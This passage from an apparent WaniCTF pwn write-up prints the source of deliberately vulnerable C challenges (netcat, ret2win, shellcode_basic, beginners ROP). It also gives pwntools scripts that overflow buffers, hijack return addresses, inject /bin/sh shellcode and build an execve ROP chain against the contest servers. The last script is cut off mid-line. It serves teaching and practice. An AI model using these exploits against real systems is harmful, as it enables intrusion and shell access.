class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  init();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> x = rand_gen(), y = rand_gen();</span><br><span class="line">  <span class="type">int</span> score = <span class="number">0</span>, chall = <span class="number">1</span>;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n+---------------------------------------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;| your score: %d, remaining %d challenges |\n&quot;</span>, score, chall);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+---------------------------------------+\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chall == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%3d + %3d = &quot;</span>, x, y);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%8s&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">if</span> (atoi(buf) == x + y) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Cool!\n&quot;</span>);</span><br><span class="line">      score++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Oops...\n&quot;</span>);</span><br><span class="line">      score = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Congrats!\n&quot;</span>);</span><br><span class="line">      win();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    x = rand_gen();</span><br><span class="line">    y = rand_gen();</span><br><span class="line">    chall--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main workflow as follows </p><ul><li>ask answer of math equation </li><li>if answer is as expected increment the score by 1 and call the <code>win</code> function if <code>score &gt;=3 </code></li><li>if not nullify the socre </li><li>decrement the <code>char</code></li></ul><p>but here is one catch, program appears to have a buffer overflow vulnerability on the line <code>scanf(&quot;%8s&quot;, buf);</code>. If the user inputs a string longer than 8 characters, it will overflow the buffer and potentially overwrite adjacent memory location i.e. <code>char</code> variable here </p><p>so if you see <code>buf</code> has 8 byte length itself and function <code>scanf(&quot;%8s&quot;, buf)</code> allowing us to input 8 byte data on buf and as we know In C, strings are represented as arrays of characters terminated by a null byte (‘\0’) after 8 byte of user input null byte wii be overwritten to char variable so it is precisely null byte overflow </p><p>and because char is decrementing each time in loop it will  never match if condition i.e. <code>chall == 0</code>  e.g </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (c &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">    c--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re,os</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;netcat-pwn.wanictf.org&quot;,9001)</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process() </span></span><br><span class="line">r = remote(<span class="string">&quot;netcat-pwn.wanictf.org&quot;</span>,<span class="number">9002</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;somedummyhere&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    data = r.recv().decode()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    equ = re.search(<span class="string">r&quot;\d+\s*\+\s*\d+&quot;</span>,data) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;equ :&quot;</span>,equ)</span><br><span class="line">    ans = <span class="built_in">eval</span>(<span class="built_in">str</span>(equ.group()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ans : &quot;</span>,ans)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.interactive() </span><br></pre></td></tr></table></figure><h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><blockquote><p>-&gt; When a new function is called in a program, the pointer to the currently executing instruction is temporarily stored in the stack area.By restoring the instruction pointer, also known as the return address, that was saved in the stack area after the function call, the program can continue execution from where it left off immediately after the function call.<br>-&gt; If you were able to overwrite the return address, you could jump to a free address in the program and execute instructions there. Could you take control of the shell by overwriting the return address that is restored after the main function ends with the address of the win function?</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_READ_LEN 48</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_stack</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n  #############################################\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #                stack state                #\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #############################################\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;                 hex           string\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_READ_LEN; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; +0x%02x | 0x%016lx | &quot;</span>, i, *(<span class="type">unsigned</span> <span class="type">long</span> *)(buf + i));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt; <span class="number">-1</span>; j--) &#123;</span><br><span class="line">      <span class="type">char</span> c = *(<span class="type">char</span> *)(buf + i + j);</span><br><span class="line">      <span class="keyword">if</span> (c &gt; <span class="number">0x7e</span> || c &lt; <span class="number">0x20</span>)</span><br><span class="line">        c = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">40</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; | &lt;- TARGET!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; |\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(<span class="string">&quot;xor %rax, %rax\n&quot;</span></span><br><span class="line">      <span class="string">&quot;xor %rsi, %rsi\n&quot;</span></span><br><span class="line">      <span class="string">&quot;xor %rdx, %rdx\n&quot;</span></span><br><span class="line">      <span class="string">&quot;mov $0x3b, %al\n&quot;</span></span><br><span class="line">      <span class="string">&quot;mov $0x68732f6e69622f, %rdi\n&quot;</span></span><br><span class="line">      <span class="string">&quot;push %rdi\n&quot;</span></span><br><span class="line">      <span class="string">&quot;mov %rsp, %rdi\n&quot;</span></span><br><span class="line">      <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ofs = <span class="number">0</span>, ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s overwrite the target address with that of the win function!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (ofs &lt; MAX_READ_LEN) &#123;</span><br><span class="line">    show_stack(buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your input (max. %d bytes) &gt; &quot;</span>, MAX_READ_LEN - ofs);</span><br><span class="line">    ret = read(<span class="number">0</span>, buf + ofs, MAX_READ_LEN - ofs);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    ofs += ret;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typical re2win challenge, buffer overflow in <code>read(0, buf + ofs, MAX_READ_LEN - ofs);</code><br>funtion</p><h4 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./chall&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;ret2win-pwn.wanictf.org&quot;</span>,<span class="number">9003</span>)</span><br><span class="line">payload=cyclic(<span class="number">40</span>)+p64(elf.sym.win)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure><h3 id="shellcode-basic"><a href="#shellcode-basic" class="headerlink" title="shellcode_basic"></a>shellcode_basic</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> code[<span class="number">1024</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter shellcode: &quot;</span>);</span><br><span class="line">  fgets(code, <span class="keyword">sizeof</span>(code), <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="type">void</span> (*shellcode)() = (<span class="type">void</span> (*)())code;</span><br><span class="line">  shellcode();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typical ret2shellcode, we have given template just send the shellcode with padding </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#pc = process(&quot;./chall&quot;)</span></span><br><span class="line">pc = remote(<span class="string">&quot;shell-basic-pwn.wanictf.org&quot;</span>,<span class="number">9004</span>)</span><br><span class="line"><span class="comment"># pc = remote(&quot;&quot;,)</span></span><br><span class="line"><span class="comment">#shell_code = b&quot;&quot;  # PUT YOUR SHELL CODE HERE</span></span><br><span class="line">pc.sendline(asm(shellcraft.amd64.linux.sh(), arch=<span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line">pc.interactive()</span><br></pre></td></tr></table></figure><h3 id="beginners-ROP"><a href="#beginners-ROP" class="headerlink" title="beginners ROP"></a>beginners ROP</h3><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><blockquote><p>-&gt; In “ret2win,” the shell was obtained by overwriting the return address with the address of the win function.<br>-&gt; In this challenge, there is no win function available. In such cases, return-oriented programming (ROP) is an effective attack technique. You can launch a shell by continuously calling fragments of instructions that end with a “ret” called gadgets.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_READ_LEN 96</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_stack</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n  #############################################\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #                stack state                #\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  #############################################\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;                 hex           string\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_READ_LEN; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; +0x%02x | 0x%016lx | &quot;</span>, i, *(<span class="type">unsigned</span> <span class="type">long</span> *)(buf + i));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">7</span>; j &gt; <span class="number">-1</span>; j--) &#123;</span><br><span class="line">      <span class="type">char</span> c = *(<span class="type">char</span> *)(buf + i + j);</span><br><span class="line">      <span class="keyword">if</span> (c &gt; <span class="number">0x7e</span> || c &lt; <span class="number">0x20</span>)</span><br><span class="line">        c = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">40</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; | &lt;- TARGET!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot; |\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;       +--------------------+----------+\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pop_rax_ret</span><span class="params">()</span> &#123; <span class="keyword">asm</span>(<span class="string">&quot;pop %rax; ret&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xor_rsi_ret</span><span class="params">()</span> &#123; <span class="keyword">asm</span>(<span class="string">&quot;xor %rsi, %rsi; ret&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xor_rdx_ret</span><span class="params">()</span> &#123; <span class="keyword">asm</span>(<span class="string">&quot;xor %rdx, %rdx; ret&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mov_rsp_rdi_pop_ret</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(<span class="string">&quot;mov %rsp, %rdi\n&quot;</span></span><br><span class="line">      <span class="string">&quot;add $0x8, %rsp\n&quot;</span></span><br><span class="line">      <span class="string">&quot;ret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_ret</span><span class="params">()</span> &#123; <span class="keyword">asm</span>(<span class="string">&quot;syscall; ret&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ofs = <span class="number">0</span>, ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s practice ROP attack!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (ofs &lt; MAX_READ_LEN) &#123;</span><br><span class="line">    show_stack(buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your input (max. %d bytes) &gt; &quot;</span>, MAX_READ_LEN - ofs);</span><br><span class="line">    ret = read(<span class="number">0</span>, buf + ofs, MAX_READ_LEN - ofs);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    ofs += ret;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>as hints says <strong>In this challenge, there is no win function available. In such cases, return-oriented programming (ROP) is an effective attack technique. You can launch a shell by continuously calling fragments of instructions that end with a “ret” called gadgets.</strong> </p><p>we have all gadgets given, use all these gadgets to make system call for <code>execve()</code>  function with <strong>&#x2F;bin&#x2F;sh</strong> arg that would be second arg for <code>execve</code> system call </p><h5 id="strategy"><a href="#strategy" class="headerlink" title="strategy"></a>strategy</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> %rax; ret               <span class="comment"># load rax with next value on stack (system call number)</span></span><br><span class="line"><span class="keyword">xor</span> %rsi, %rsi; ret         <span class="comment"># clear rsi (second argument)</span></span><br><span class="line"><span class="keyword">xor</span> %rdx, %rdx; ret         <span class="comment"># clear rdx (third argument)</span></span><br><span class="line">mov %rsp, %rdi              <span class="comment"># load rdi with pointer to the command to execute (first argument)</span></span><br><span class="line">add $0x8, %rsp              <span class="comment"># skip the old rax value and align the stack</span></span><br><span class="line">ret                         <span class="comment"># return to the next instruction</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">syscall</span>; ret                <span class="comment"># trigger the system call</span></span><br></pre></td></tr></table></figure><p>where </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = <span class="number">0</span>x3b  # system call number for execve</span><br><span class="line">rdi = pointer <span class="selector-tag">to</span> &quot;/bin/sh&quot;  # command <span class="selector-tag">to</span> execute</span><br><span class="line">rsi = pointer <span class="selector-tag">to</span> NULL  # arguments for the command</span><br><span class="line">rdx = pointer <span class="selector-tag">to</span> NULL  # environment variables</span><br></pre></td></tr></table></figure><h4 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;chall_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) </span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span> </span><br><span class="line">offset = <span class="number">40</span> </span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27; continue &#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># Allows you to switch between local/GDB/remote from terminal</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create ROP object and set gadgets</span></span><br><span class="line">    rop = ROP(exe)</span><br><span class="line">    </span><br><span class="line">    pop_rax = <span 